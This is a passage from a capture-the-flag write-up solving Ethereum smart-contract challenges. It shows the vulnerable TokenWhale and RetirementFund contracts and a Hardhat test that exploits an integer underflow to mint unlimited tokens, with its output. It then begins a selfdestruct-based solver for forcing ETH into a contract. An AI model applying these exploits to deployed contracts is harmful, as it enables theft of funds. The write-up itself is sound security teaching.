</span></span><span class="line" line="44"><span style="--shiki-default:#F97583">        emit</span><span style="--shiki-default:#B392F0"> Approval</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">, spender, value);
</span></span><span class="line" line="45"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="46"><span emptylineplaceholder="true">
</span></span><span class="line" line="47"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> transferFrom</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#FFAB70"> from</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#FFAB70"> to</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> value</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="48"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(balanceOf[from] </span><span style="--shiki-default:#F97583">&gt;=</span><span style="--shiki-default:#E1E4E8"> value);
</span></span><span class="line" line="49"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(balanceOf[to] </span><span style="--shiki-default:#F97583">+</span><span style="--shiki-default:#E1E4E8"> value </span><span style="--shiki-default:#F97583">&gt;=</span><span style="--shiki-default:#E1E4E8"> balanceOf[to]);
</span></span><span class="line" line="50"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(allowance[from][</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">&gt;=</span><span style="--shiki-default:#E1E4E8"> value);
</span></span><span class="line" line="51"><span emptylineplaceholder="true">
</span></span><span class="line" line="52"><span style="--shiki-default:#E1E4E8">        allowance[from][</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">-=</span><span style="--shiki-default:#E1E4E8"> value;
</span></span><span class="line" line="53"><span style="--shiki-default:#B392F0">        _transfer</span><span style="--shiki-default:#E1E4E8">(to, value);
</span></span><span class="line" line="54"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="55"><span style="--shiki-default:#E1E4E8">}
</span></span></code><!--]--></pre></div></div><p><!--[-->However they have implemented the transferFrom method quite badly wrong. Notice that it calls the <code class=""><!--[-->_transfer<!--]--></code> method at the end, which <em><!--[-->always<!--]--></em> affects the balance of <code class=""><!--[-->msg.sender<!--]--></code>, not the balance of the <code class=""><!--[-->from<!--]--></code> account. So as long as we can pass the checks in the <code class=""><!--[-->transferFrom<!--]--></code> method, we can then exploit the fact that in the same way that integers can be overflowed back to 0, they can also be underflowed back to 2<sup>256</sup>-1.<!--]--></p><p><!--[-->To do this, we need to approve another wallet which has a token balance of 0, to transfer tokens from our account. Then this other account can call <code class=""><!--[-->transferFrom<!--]--></code> on the <code class=""><!--[-->player<!--]--></code> account, and we&#39;ll see that the second account&#39;s balance has wrapped back round to 2<sup>256</sup>-1. Then the second account can just transfer as many tokens as we want to the player account to let us complete the challenge. Let&#39;s check that our logic for the first part is right:<!--]--></p><div language="typescript" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">test/math/token-whale-challenge.ts</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-typescript shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { expect } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;chai&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { ethers } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;hardhat&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="3"><span emptylineplaceholder="true">
</span></span><span class="line" line="4"><span style="--shiki-default:#B392F0">describe</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;TokenWhaleChallenge&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0">  it</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;should return true if we increase the player&#39;s token balance to over 1 million tokens&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">async</span><span style="--shiki-default:#F97583"> function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="6"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#E1E4E8"> [, </span><span style="--shiki-default:#79B8FF">player</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">helper</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getSigners</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="7"><span emptylineplaceholder="true">
</span></span><span class="line" line="8"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> Challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getContractFactory</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;TokenWhaleChallenge&quot;</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="9"><span emptylineplaceholder="true">
</span></span><span class="line" line="10"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> Challenge.</span><span style="--shiki-default:#B392F0">deploy</span><span style="--shiki-default:#E1E4E8">(player.address);
</span></span><span class="line" line="11"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">deployed</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="12"><span emptylineplaceholder="true">
</span></span><span class="line" line="13"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> approvalTx</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> challenge
</span></span><span class="line" line="14"><span style="--shiki-default:#E1E4E8">      .</span><span style="--shiki-default:#B392F0">connect</span><span style="--shiki-default:#E1E4E8">(player)
</span></span><span class="line" line="15"><span style="--shiki-default:#E1E4E8">      .</span><span style="--shiki-default:#B392F0">approve</span><span style="--shiki-default:#E1E4E8">(helper.address, </span><span style="--shiki-default:#79B8FF">10</span><span style="--shiki-default:#F97583"> *</span><span style="--shiki-default:#79B8FF"> 10</span><span style="--shiki-default:#F97583"> **</span><span style="--shiki-default:#79B8FF"> 8</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="16"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> approvalTx.</span><span style="--shiki-default:#B392F0">wait</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="17"><span emptylineplaceholder="true">
</span></span><span class="line" line="18"><span style="--shiki-default:#6A737D">    // It doesn&#39;t matter who we transfer tokens to, because the contract has no
</span></span><span class="line" line="19"><span style="--shiki-default:#6A737D">    // restrictions on this, and it doesn&#39;t affect the test to do it this way.
</span></span><span class="line" line="20"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> transferTx1</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> challenge
</span></span><span class="line" line="21"><span style="--shiki-default:#E1E4E8">      .</span><span style="--shiki-default:#B392F0">connect</span><span style="--shiki-default:#E1E4E8">(helper)
</span></span><span class="line" line="22"><span style="--shiki-default:#E1E4E8">      .</span><span style="--shiki-default:#B392F0">transferFrom</span><span style="--shiki-default:#E1E4E8">(player.address, player.address, </span><span style="--shiki-default:#79B8FF">1</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="23"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> transferTx1.</span><span style="--shiki-default:#B392F0">wait</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="24"><span emptylineplaceholder="true">
</span></span><span class="line" line="25"><span style="--shiki-default:#E1E4E8">    console.</span><span style="--shiki-default:#B392F0">log</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#F97583">await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">balanceOf</span><span style="--shiki-default:#E1E4E8">(helper.address));
</span></span><span class="line" line="26"><span style="--shiki-default:#E1E4E8">  });
</span></span><span class="line" line="27"><span style="--shiki-default:#E1E4E8">});
</span></span></code><!--]--></pre></div></div><p><!--[-->Now if we run this test with <code class=""><!--[-->npx hardhat test test/math/token-whale-challenge.ts<!--]--></code>, we get the following output:<!--]--></p><div><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code>  TokenWhaleChallenge
BigNumber { value: &quot;115792089237316195423570985008687907853269984665640564039457584007913129639935&quot; }
    ✓ should return true if we increase the player&#39;s token balance to over 1 million tokens (717ms)


  1 passing (719ms)
</code><!--]--></pre></div></div><p><!--[-->That is definitely more than 1 million tokens! Exactly as expected, it is equal to <code class=""><!--[-->ethers.constants.MaxUint256<!--]--></code>. Now we just need to transfer some of these tokens to the player&#39;s account:<!--]--></p><div language="diff" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-diff shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#79B8FF">diff --git a/test/math/token-whale-challenge.ts b/test/math/token-whale-challenge.ts
</span></span><span class="line" line="2"><span style="--shiki-default:#E1E4E8">index 9c7c877..7655280 100644
</span></span><span class="line" line="3"><span style="--shiki-default:#FDAEB7">--- a/test/math/token-whale-challenge.ts
</span></span><span class="line" line="4"><span style="--shiki-default:#85E89D">+++ b/test/math/token-whale-challenge.ts
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0;--shiki-default-font-weight:bold">@@ -22,6 +22,13 @@</span><span style="--shiki-default:#E1E4E8"> describe(&quot;TokenWhaleChallenge&quot;, function () {
</span></span><span class="line" line="6"><span style="--shiki-default:#E1E4E8">       .transferFrom(player.address, player.address, 1);
</span></span><span class="line" line="7"><span style="--shiki-default:#E1E4E8">     await transferTx1.wait();
</span></span><span class="line" line="8"><span emptylineplaceholder="true">
</span></span><span class="line" line="9"><span style="--shiki-default:#FDAEB7">-    console.log(await challenge.balanceOf(helper.address));
</span></span><span class="line" line="10"><span style="--shiki-default:#85E89D">+    // It doesn&#39;t matter who we transfer tokens to, because the contract has no
</span></span><span class="line" line="11"><span style="--shiki-default:#85E89D">+    // restrictions on this, and it doesn&#39;t affect the test to do it this way.
</span></span><span class="line" line="12"><span style="--shiki-default:#85E89D">+    const transferTx2 = await challenge
</span></span><span class="line" line="13"><span style="--shiki-default:#85E89D">+      .connect(helper)
</span></span><span class="line" line="14"><span style="--shiki-default:#85E89D">+      .transfer(player.address, 10 ** 6);
</span></span><span class="line" line="15"><span style="--shiki-default:#85E89D">+    await transferTx2.wait();
</span></span><span class="line" line="16"><span style="--shiki-default:#85E89D">+
</span></span><span class="line" line="17"><span style="--shiki-default:#85E89D">+    expect(await challenge.isComplete()).to.equal(true);
</span></span><span class="line" line="18"><span style="--shiki-default:#E1E4E8">   });
</span></span><span class="line" line="19"><span style="--shiki-default:#E1E4E8"> });
</span></span></code><!--]--></pre></div></div><p><!--[-->Tada! Our player account now has 1,001,001 tokens!<!--]--></p><h3 id="retirementfundchallenge"><a href="#retirementfundchallenge"><!--[-->RetirementFundChallenge<!--]--></a></h3><p><!--[-->The Retirement Fund challenge is another underflow-based challenge. Looking at the code, you can see that <code class=""><!--[-->uint256 withdrawn<!--]--></code> in the <code class=""><!--[-->collectPenalty<!--]--></code> method has no bounds checking. So if we can force <code class=""><!--[-->address(this).balance<!--]--></code> to be greater than <code class=""><!--[-->startBalance<!--]--></code>, we should be able to drain the contract.<!--]--></p><div language="solidity" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">contracts/math/RetirementFundChallenge.sol</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-solidity shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">pragma</span><span style="--shiki-default:#85E89D"> solidity</span><span style="--shiki-default:#79B8FF"> ^0.4.21</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span emptylineplaceholder="true">
</span></span><span class="line" line="3"><span style="--shiki-default:#F97583">contract</span><span style="--shiki-default:#B392F0"> RetirementFundChallenge</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="4"><span style="--shiki-default:#79B8FF">    uint256</span><span style="--shiki-default:#E1E4E8"> startBalance;
</span></span><span class="line" line="5"><span style="--shiki-default:#79B8FF">    address</span><span style="--shiki-default:#E1E4E8"> owner </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> msg.sender</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="6"><span style="--shiki-default:#79B8FF">    address</span><span style="--shiki-default:#E1E4E8"> beneficiary;
</span></span><span class="line" line="7"><span style="--shiki-default:#79B8FF">    uint256</span><span style="--shiki-default:#E1E4E8"> expiration </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> now</span><span style="--shiki-default:#F97583"> +</span><span style="--shiki-default:#79B8FF"> 10</span><span style="--shiki-default:#79B8FF"> years</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="8"><span emptylineplaceholder="true">
</span></span><span class="line" line="9"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> RetirementFundChallenge</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#FFAB70"> player</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> payable</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="10"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg</span><span style="--shiki-default:#E1E4E8">.value </span><span style="--shiki-default:#F97583">==</span><span style="--shiki-default:#79B8FF"> 1</span><span style="--shiki-default:#79B8FF"> ether</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="11"><span emptylineplaceholder="true">
</span></span><span class="line" line="12"><span style="--shiki-default:#E1E4E8">        beneficiary </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#E1E4E8"> player;
</span></span><span class="line" line="13"><span style="--shiki-default:#E1E4E8">        startBalance </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> msg</span><span style="--shiki-default:#E1E4E8">.value;
</span></span><span class="line" line="14"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="15"><span emptylineplaceholder="true">
</span></span><span class="line" line="16"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> isComplete</span><span style="--shiki-default:#E1E4E8">() </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> view</span><span style="--shiki-default:#F97583"> returns</span><span style="--shiki-default:#E1E4E8"> (</span><span style="--shiki-default:#79B8FF">bool</span><span style="--shiki-default:#E1E4E8">) {
</span></span><span class="line" line="17"><span style="--shiki-default:#F97583">        return</span><span style="--shiki-default:#79B8FF"> address</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">this</span><span style="--shiki-default:#E1E4E8">).balance </span><span style="--shiki-default:#F97583">==</span><span style="--shiki-default:#79B8FF"> 0</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="18"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="19"><span emptylineplaceholder="true">
</span></span><span class="line" line="20"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> withdraw</span><span style="--shiki-default:#E1E4E8">() </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="21"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#F97583"> ==</span><span style="--shiki-default:#E1E4E8"> owner);
</span></span><span class="line" line="22"><span emptylineplaceholder="true">
</span></span><span class="line" line="23"><span style="--shiki-default:#F97583">        if</span><span style="--shiki-default:#E1E4E8"> (</span><span style="--shiki-default:#79B8FF">now</span><span style="--shiki-default:#F97583"> &lt;</span><span style="--shiki-default:#E1E4E8"> expiration) {
</span></span><span class="line" line="24"><span style="--shiki-default:#6A737D">            // early withdrawal incurs a 10% penalty
</span></span><span class="line" line="25"><span style="--shiki-default:#79B8FF">            msg.sender</span><span style="--shiki-default:#E1E4E8">.</span><span style="--shiki-default:#B392F0">transfer</span><span style="--shiki-default:#E1E4E8">((</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">this</span><span style="--shiki-default:#E1E4E8">).balance </span><span style="--shiki-default:#F97583">*</span><span style="--shiki-default:#79B8FF"> 9</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">/</span><span style="--shiki-default:#79B8FF"> 10</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="26"><span style="--shiki-default:#E1E4E8">        } </span><span style="--shiki-default:#F97583">else</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="27"><span style="--shiki-default:#79B8FF">            msg.sender</span><span style="--shiki-default:#E1E4E8">.</span><span style="--shiki-default:#B392F0">transfer</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">this</span><span style="--shiki-default:#E1E4E8">).balance);
</span></span><span class="line" line="28"><span style="--shiki-default:#E1E4E8">        }
</span></span><span class="line" line="29"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="30"><span emptylineplaceholder="true">
</span></span><span class="line" line="31"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> collectPenalty</span><span style="--shiki-default:#E1E4E8">() </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="32"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#F97583"> ==</span><span style="--shiki-default:#E1E4E8"> beneficiary);
</span></span><span class="line" line="33"><span emptylineplaceholder="true">
</span></span><span class="line" line="34"><span style="--shiki-default:#79B8FF">        uint256</span><span style="--shiki-default:#E1E4E8"> withdrawn </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#E1E4E8"> startBalance </span><span style="--shiki-default:#F97583">-</span><span style="--shiki-default:#79B8FF"> address</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">this</span><span style="--shiki-default:#E1E4E8">).balance;
</span></span><span class="line" line="35"><span emptylineplaceholder="true">
</span></span><span class="line" line="36"><span style="--shiki-default:#6A737D">        // an early withdrawal occurred
</span></span><span class="line" line="37"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(withdrawn </span><span style="--shiki-default:#F97583">&gt;</span><span style="--shiki-default:#79B8FF"> 0</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="38"><span emptylineplaceholder="true">
</span></span><span class="line" line="39"><span style="--shiki-default:#6A737D">        // penalty is what&#39;s left
</span></span><span class="line" line="40"><span style="--shiki-default:#79B8FF">        msg.sender</span><span style="--shiki-default:#E1E4E8">.</span><span style="--shiki-default:#B392F0">transfer</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">this</span><span style="--shiki-default:#E1E4E8">).balance);
</span></span><span class="line" line="41"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="42"><span style="--shiki-default:#E1E4E8">}
</span></span></code><!--]--></pre></div></div><p><!--[-->We can trigger this by using the EVM opcode <code class=""><!--[-->selfdestruct<!--]--></code>, which removes all of a contract&#39;s data from the blockchain, and sends any ETH in the contract to an address of the contract&#39;s choosing. This can be (ab)used to force ETH into any account or smart contract. This forced sending of ETH cannot be prevented - meaning we should never rely on the balance of a contract being any specific value. To implement this, we write a contract that does nothing but allow us to blow it up and send an amount of ETH in the transaction.<!--]--></p><div language="solidity" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">contracts/math/solvers/RetirementFundSolver.sol</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-solidity shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">pragma</span><span style="--shiki-default:#85E89D"> solidity</span><span style="--shiki-default:#79B8FF"> ^0.4.21</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span emptylineplaceholder="true">
</span></span><span class="line" line="3"><span style="--shiki-default:#F97583">contract</span><span style="--shiki-default:#B392F0"> RetirementFundSolver</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="4"><span style="--shiki-default:#79B8FF">    address</span><span style="--shiki-default:#E1E4E8"> owner;
</span></span><span class="line" line="5"><span emptylineplaceholder="true">
</span></span><span class="line" line="6"><span style="--shiki-default:#F97583">    constructor</span><span style="--shiki-default:#E1E4E8">() </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="7"><span style="--shiki-default:#E1E4E8">        owner </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> msg.sender</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="8"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="9"><span emptylineplaceholder="true">
</span></span><span class="line" line="10"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> die</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#FFAB70"> target</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> payable</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="11"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#F97583"> ==</span><span style="--shiki-default:#E1E4E8"> owner, </span><span style="--shiki-default:#9ECBFF">&quot;Access denied&quot;</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="12"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg</span><span style="--shiki-default:#E1E4E8">.value </span><span style="--shiki-default:#F97583">&gt;</span><span style="--shiki-default:#79B8FF"> 0</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#9ECBFF">&quot;Must have a value&quot;</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="13"><span emptylineplaceholder="true">
